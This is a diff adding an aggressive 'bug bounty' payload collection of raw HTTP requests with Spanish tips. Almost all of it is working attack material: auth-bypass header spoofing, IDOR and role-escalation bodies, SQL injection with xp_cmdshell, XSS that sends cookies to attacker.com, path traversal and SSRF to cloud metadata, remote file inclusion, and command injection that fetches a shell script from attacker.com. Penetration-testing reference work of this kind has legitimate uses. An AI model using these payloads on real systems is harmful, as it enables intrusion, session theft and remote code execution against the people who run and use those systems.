@@ -1,0 +1,321 @@
+# ========================
+# Bug Bounty Ultra Advanced & Aggressive Requests Collection
+# ========================
+
+# Request 1: Get user profile (JWT, header fuzz, WAF bypass, HTTP smuggling, race condition, advanced evasion)
+GET /api/users/{{USER_ID}}/profile HTTP/1.1
+Host: target.com
+Authorization: Bearer {{JWT_TOKEN}}
+X-Original-URL: /api/users/{{USER_ID}}/profile
+X-Forwarded-For: 127.0.0.1, localhost, 10.0.0.1, ::1, 2130706433, 0x7f000001, 0177.0.0.1
+X-Client-IP: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+X-Forwarded-Host: admin.target.com
+X-Host: admin.target.com
+X-Forwarded-Scheme: http
+X-HTTP-Method-Override: GET
+X-HTTP-Method: DELETE
+X-Method-Override: PUT
+X-Forwarded-Proto: https
+X-Forwarded-Port: 443
+X-Original-Method: POST
+X-Request-Id: {{RANDOM}}
+X-Api-Version: v1
+X-Forwarded-Server: 127.0.0.1
+X-Real-IP: 127.0.0.1
+X-Forwarded-User: admin
+X-Forwarded-Password: password
+X-Forwarded-Authorization: Basic YWRtaW46cGFzc3dvcmQ=
+X-Original-Host: admin.target.com
+X-Original-Forwarded-For: 127.0.0.1
+X-Original-Remote-Addr: 127.0.0.1
+X-Original-Client-IP: 127.0.0.1
+X-Original-Proto: https
+X-Original-Scheme: http
+X-Original-Url: /api/users/{{USER_ID}}/profile
+X-Forwarded-For-Original: 127.0.0.1
+X-Forwarded-For-Alt: 127.0.0.1
+X-Forwarded-For-Backup: 127.0.0.1
+X-Forwarded-For-Bypass: 127.0.0.1
+Transfer-Encoding: chunked
+Content-Length: 0
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AggressiveScanner/99.9
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Pragma: no-cache
+Cache-Control: no-cache
+TE: trailers
+# Tip: Fuzzea todos los headers, prueba JWTs forjados, tokens de otros usuarios, tokens expirados, tokens nulos, tokens con firma "none"
+# Tip: Prueba HTTP smuggling, race conditions (requests simultáneos), manipulación de User-Agent, variantes de IP, variantes de cabeceras, bypass de autenticación
+
+# Request 2: Update user profile (IDOR, privilege escalation, JSON fuzzing, deserialization, encoding, nested objects, array abuse)
+POST /api/users/{{USER_ID}}/update HTTP/1.1
+Host: target.com
+Content-Type: application/json
+Authorization: Bearer {{JWT_TOKEN}}
+X-Forwarded-For: 127.0.0.1
+X-HTTP-Method-Override: PATCH
+X-Api-Version: v2
+User-Agent: AggressiveFuzzer/1.0
+
+{
+  "email": "victim@example.com",
+  "name": "Attacker",
+  "role": "admin",
+  "is_admin": true,
+  "password": "123456",
+  "extra_field": "' OR 1=1--",
+  "payload": "{{DESERIALIZATION_PAYLOAD}}",
+  "user_id": "{{USER_ID}}",
+  "user_id_encoded": "%32%31%33",
+  "user_id_array": ["{{USER_ID}}", "1", "2"],
+  "admin": "true",
+  "csrf": "{{CSRF_TOKEN}}",
+  "profile": {
+    "bio": "<script>alert(1)</script>",
+    "avatar": "http://127.0.0.1:80/admin"
+  },
+  "permissions": ["admin", "user", "superuser"],
+  "settings": {
+    "theme": "dark",
+    "language": "en",
+    "notifications": true
+  },
+  "overrides": {
+    "X-Forwarded-For": "127.0.0.1"
+  }
+}
+# Tip: Añade campos inesperados, prueba con y sin Authorization, cambia USER_ID por otros IDs, fuzzing masivo en campos, encoding de parámetros, objetos anidados, arrays, abuse de tipos
+
+# Request 3: Transaction details (Session fixation, cookie fuzz, header fuzz, HTTP parameter pollution, logic bypass, encoding, multi-cookies)
+GET /api/transactions/{{TRANSACTION_ID}}/details?admin=true&user=attacker&user=admin&%75ser=admin&user%00=admin&user[]=admin HTTP/1.1
+Host: target.com
+Cookie: sessionid={{SESSION_ID}}; admin=true; csrf_bypass=1; PHPSESSID=../../../../etc/passwd; Secure; HttpOnly; sessionid=evil; sessionid=another
+X-Forwarded-For: 127.0.0.1, 10.10.10.10, 0.0.0.0, 2130706433
+Referer: https://evil.com/
+Origin: https://evil.com/
+X-Original-URL: /api/transactions/{{TRANSACTION_ID}}/details
+X-Api-Version: v3
+User-Agent: AggressiveLogicBreaker/2.0
+X-Forwarded-User: admin
+# Tip: Prueba sessionid de otro usuario, sessionid inválido, sin cookie, cookies combinadas, HTTP parameter pollution, encoding de parámetros, múltiples cookies con el mismo nombre
+
+# Request 4: Account deletion (CSRF, auth bypass, header/cookie fuzz, HTTP method confusion, logic abuse, multi-confirm, encoding)
+POST /account/delete HTTP/1.1
+Host: target.com
+Content-Type: application/x-www-form-urlencoded
+Cookie: sessionid={{SESSION_ID}}; csrf_bypass=1; admin=true; Secure; HttpOnly; sessionid=evil
+Origin: https://evil.com
+Referer: https://evil.com/delete
+X-HTTP-Method-Override: GET
+X-Api-Version: v4
+User-Agent: UltraCSRFTester/3.0
+
+csrf_token={{CSRF_TOKEN}}&confirm=yes&confirm=no&confirm=1&confirm=0&confirm[]=yes&confirm%00=yes
+# Tip: Prueba sin csrf_token, csrf_token inválido, sin cookie, Referer/Origin maliciosos, doble confirmación, valores booleanos, encoding, arrays, null bytes
+
+# Request 5: Admin panel access (privilege escalation, header manipulation, HTTP smuggling, encoding, logic bypass, advanced headers)
+GET /admin/panel HTTP/1.1
+Host: target.com
+Cookie: sessionid={{SESSION_ID}}; admin=true; Secure; HttpOnly; sessionid=evil
+X-Forwarded-For: 127.0.0.1, 10.0.0.1, 0.0.0.0, 2130706433
+X-Original-URL: /admin/panel
+X-Host: admin.target.com
+X-HTTP-Method-Override: POST
+Transfer-Encoding: chunked
+Content-Length: 0
+X-Api-Version: v5
+User-Agent: UltraPrivilegeEscalator/4.0
+X-Forwarded-User: admin
+X-Forwarded-Password: password
+X-Forwarded-Authorization: Basic YWRtaW46cGFzc3dvcmQ=
+# Tip: Prueba diferentes sessionid, sin cookie, cabeceras de manipulación, roles distintos, HTTP smuggling, encoding, headers avanzados
+
+# ========================
+# SQL Injection (WAF bypass, stacked queries, time-based, encoding, logic, comment, union, boolean, error-based, out-of-band)
+GET /api/search?q=' OR 1=1-- -%00 HTTP/1.1
+Host: target.com
+
+GET /api/search?q=1;WAITFOR DELAY '0:0:5'-- HTTP/1.1
+Host: target.com
+
+GET /api/search?q=%27%20OR%201%3D1--%20-%2500 HTTP/1.1
+Host: target.com
+
+GET /api/search?q=1'/**/OR/**/1=1-- HTTP/1.1
+Host: target.com
+
+GET /api/search?q=1' UNION SELECT NULL,NULL-- HTTP/1.1
+Host: target.com
+
+GET /api/search?q=1' AND SLEEP(5)--+ HTTP/1.1
+Host: target.com
+
+GET /api/search?q=1' AND (SELECT 1 FROM PG_SLEEP(5))-- HTTP/1.1
+Host: target.com
+
+GET /api/search?q=1' AND updatexml(1,concat(0x7e,(SELECT user())),0)-- HTTP/1.1
+Host: target.com
+
+GET /api/search?q=1';exec+xp_cmdshell('ping+attacker.com')-- HTTP/1.1
+Host: target.com
+
+# ========================
+# XSS (SVG, JS, event handlers, encoding, logic, DOM, attribute, JS context, out-of-band)
+GET /profile?name=<img src=x onerror=alert(1)> HTTP/1.1
+Host: target.com
+
+GET /profile?name=<svg/onload=alert(1)> HTTP/1.1
+Host: target.com
+
+GET /profile?name=%3Csvg%2Fonload%3Dalert(1)%3E HTTP/1.1
+Host: target.com
+
+GET /profile?name="><script>alert(document.domain)</script> HTTP/1.1
+Host: target.com
+
+GET /profile?name=<body onload=alert(1)> HTTP/1.1
+Host: target.com
+
+GET /profile?name=<iframe src="javascript:alert(1)"></iframe> HTTP/1.1
+Host: target.com
+
+GET /profile?name=<a href="javascript:alert(1)">click</a> HTTP/1.1
+Host: target.com
+
+GET /profile?name=<img src=x onerror=fetch('https://attacker.com/'+document.cookie)> HTTP/1.1
+Host: target.com
+
+# ========================
+# Path Traversal (double encoding, null byte, overlong UTF-8, logic, wrappers, bypass, alternate separators)
+GET /api/files/download?file=..%252f..%252f..%252f..%252fetc%252fpasswd HTTP/1.1
+Host: target.com
+
+GET /api/files/download?file=../../../../../../etc/passwd%00 HTTP/1.1
+Host: target.com
+
+GET /api/files/download?file=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd HTTP/1.1
+Host: target.com
+
+GET /api/files/download?file=..\\..\\..\\..\\windows\\win.ini HTTP/1.1
+Host: target.com
+
+GET /api/files/download?file=//etc/passwd HTTP/1.1
+Host: target.com
+
+GET /api/files/download?file=....//....//....//....//etc/passwd HTTP/1.1
+Host: target.com
+
+GET /api/files/download?file=php://filter/convert.base64-encode/resource=../../../../etc/passwd HTTP/1.1
+Host: target.com
+
+# ========================
+# SSRF (localhost, metadata, DNS rebinding, encoding, logic, alternate ports, file://, gopher://, out-of-band)
+POST /api/fetch HTTP/1.1
+Host: target.com
+Content-Type: application/json
+
+{
+  "url": "http://127.0.0.1:80/admin"
+}
+
+{
+  "url": "http://169.254.169.254/latest/meta-data/"
+}
+
+{
+  "url": "http://evil.com@127.0.0.1/"
+}
+
+{
+  "url": "http://[::1]/"
+}
+
+{
+  "url": "file:///etc/passwd"
+}
+
+{
+  "url": "gopher://127.0.0.1:11211/_stats"
+}
+
+{
+  "url": "http://localhost:8080/"
+}
+
+{
+  "url": "http://attacker.com/?cb={{RANDOM}}"
+}
+
+# ========================
+# LFI/RFI (null byte, wrappers, encoding, logic, remote, filter, alternate wrappers)
+GET /download?file=../../../../../../etc/passwd%00 HTTP/1.1
+Host: target.com
+
+GET /download?file=php://filter/convert.base64-encode/resource=index.php HTTP/1.1
+Host: target.com
+
+GET /download?file=..%252f..%252f..%252f..%252fetc%252fpasswd%00 HTTP/1.1
+Host: target.com
+
+GET /download?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg== HTTP/1.1
+Host: target.com
+
+GET /download?file=http://attacker.com/shell.txt HTTP/1.1
+Host: target.com
+
+# ========================
+# RCE (command injection, YAML, PHP wrappers, encoding, logic, out-of-band, chaining)
+POST /api/ping HTTP/1.1
+Host: target.com
+Content-Type: application/json
+
+{
+  "host": "127.0.0.1; id"
+}
+
+{
+  "host": "127.0.0.1 && cat /etc/passwd"
+}
+
+{
+  "host": "`id`"
+}
+
+{
+  "host": "127.0.0.1 | curl http://attacker.com/`whoami`"
+}
+
+{
+  "host": "127.0.0.1; ping -c 1 attacker.com"
+}
+
+{
+  "host": "127.0.0.1; sleep 10"
+}
+
+{
+  "host": "127.0.0.1; $(curl attacker.com/shell.sh)"
+}
+
+# ========================
+# HTTP Method Override / Smuggling / Logic / Advanced
+POST /api/users/{{USER_ID}}/profile HTTP/1.1
+Host: target.com
+X-HTTP-Method-Override: DELETE
+X-Method-Override: PUT
+X-HTTP-Method: PATCH
+Authorization: Bearer {{JWT_TOKEN}}
+Transfer-Encoding: chunked
+Content-Length: 0
+
+# ========================
+# Notas:
+# - Usa {{VARIABLES}} para automatizar con Burp, Postman, o scripts.
+# - Manipula cabeceras: X-Forwarded-For, X-Original-URL, X-Client-IP, Referer, Origin, User-Agent, X-Host, X-Api-Version, etc.
+# - Prueba combinaciones de métodos HTTP: GET, POST, PUT, DELETE, PATCH, OPTIONS, HEAD, TRACE, CONNECT, PROPFIND, MOVE, COPY.
+# - Añade payloads de fuzzing en parámetros, cabeceras y cuerpos.
+# - Automatiza pruebas con secuencias, diccionarios personalizados, y técnicas combinadas.
+# - Incluye variantes para bypass de WAF, IDS, controles de autenticación, lógica de negocio, y evasión avanzada.
+# ...existing code...
